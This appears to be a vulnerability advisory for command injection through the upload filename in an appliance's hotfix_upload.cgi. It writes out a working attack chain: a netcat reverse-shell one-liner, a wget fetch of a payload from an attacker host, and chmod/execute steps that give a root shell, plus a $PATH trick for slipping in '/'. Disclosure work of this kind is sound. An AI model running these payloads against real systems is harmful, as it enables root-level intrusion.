Summary:

The hotfix_upload.cgi file contains a flaw allowing a user to execute commands under the context of the root user.

Details:

The hotfix_upload.cgi file is used to upload files (hot fixes). Below is a sample of the upload function being used:

POST /cgi-bin/hotfix_upload.cgi?sID=hotfix_temp HTTP/1.1
Accept: image/jpeg, image/gif, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*

The actual injection takes place in the name of the file being uploaded (ie. filename=”test.txt&id”). By performing the following request, system information is sent back in the response:

This gives any user the ability to execute simple non interactive commands. However, more complex (including remote shell) commands are possible.

Special characters like ‘/’,'<‘,’>’ are not sent across to the server. But utilizing the environment itself, it becomes possible to insert characters like the ‘/’. Below is an example of a user using this method to retrieve the /etc/passwd file (NOTE: `echo $PATH | cut -c1` will print ‘/‘ to the final command):

Now the attacker has the ability to create a shell by uploading a file containing the following (where [ip address] is your receiving machine):

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip address] 5555 >/tmp/f

To upload the file, the attacker simply names this file to shell, then uploads using this vulnerability and wget:

test.txt&wget http:`echo $PATH | cut -c1“echo $PATH | cut -c1`[ip]`echo $PATH | cut -c1`shell

Once the file has been uploaded (it will be placed in /opt/TrendMicro/MinorityReport/www/cgi-bin), the attacker can chmod and then execute the file as a script, creating a reverse shell, running as root:

test.xml&chmod a+x shell

test.xml&.`echo $PATH | cut -c1`shell
